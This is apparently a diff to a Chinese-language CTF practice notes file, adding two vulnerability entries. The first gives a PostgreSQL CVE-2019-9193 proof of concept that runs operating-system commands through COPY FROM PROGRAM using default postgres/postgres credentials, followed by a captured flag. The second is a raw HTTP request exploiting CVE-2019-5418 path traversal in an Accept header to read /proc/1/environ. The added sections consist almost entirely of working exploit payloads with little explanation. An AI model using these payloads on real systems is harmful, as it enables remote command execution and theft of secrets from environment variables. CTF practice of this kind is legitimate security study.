@@ -6,6 +6,8 @@
 - [ThinkPHP-2-Rce](#ThinkPHP-2-Rce)
 - [Flask-SSTI](#Flask-SSTI)
 - [s2-005](#s2-005)
+- [Postgres-CVE-2019-9193](#Postgres-CVE-2019-9193)
+- [CVE-2019-5418](#CVE-2019-5418)
 
 
 ## PHP-XXE
@@ -96,3 +98,36 @@ jboss反序列化_CVE-2017-12149.jar
 ## JMXInvokerServlet-deserialization
 
 jboss反序列化_CVE-2017-12149.jar
+
+## Postgres-CVE-2019-9193
+
+Navicat连接数据库，数据库初始账号密码为postgres/postgres
+
+影响版本：PostgreSQL 9.3-11.2
+poc
+```
+DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM 'env';
+SELECT * FROM cmd_exec;
+```
+
+打印环境变量
+
+flag{ba05334a-790f-4092-b65b-85ba70e84722}
+
+## CVE-2019-5418
+
+```
+GET /robots HTTP/1.1
+Host: node4.buuoj.cn:27855
+Pragma: no-cache
+Cache-Control: no-cache
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36
+Accept: ../../../../../../../../proc/1/environ{{
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: UM_distinctid=17b865c3e394c2-036255e722aa89-c343365-1fa400-17b865c3e3a43b; _blog_session=yk3j3zdsE38sGRr1qChqiP2c%2FsLP6%2FtP1%2FbNQ%2B2h8cFWVt0DIfVVFPKOcetA7wbAOkrZjWGwL4%2F00d6NYn7RSdUbgKrh4yhR%2FA3Zh13GPpdT8PA5nipbtFr%2Bv4Cp2YUu1HBuaMrvxiV1x8bIsQg%3D--wfXpXJkuxo69%2B2rQ--BYQP7mw53G7Eg%2F4MyvECHg%3D%3D
+Connection: close
+```
